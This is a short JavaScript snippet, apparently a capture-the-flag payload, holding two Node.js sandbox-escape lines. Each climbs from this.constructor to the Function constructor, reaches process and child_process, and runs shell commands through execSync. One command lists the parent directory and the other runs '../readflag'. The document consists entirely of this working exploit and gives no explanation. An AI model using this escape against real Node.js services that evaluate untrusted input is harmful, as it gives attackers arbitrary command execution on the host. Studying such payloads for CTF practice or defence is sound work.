this.constructor
  .constructor("return process")()
  .mainModule.require("child_process")
  .execSync("ls ../")
  .toString();

this.constructor
  .constructor("return process")()
  .mainModule.require("child_process")
  .execSync("../readflag")
  .toString();
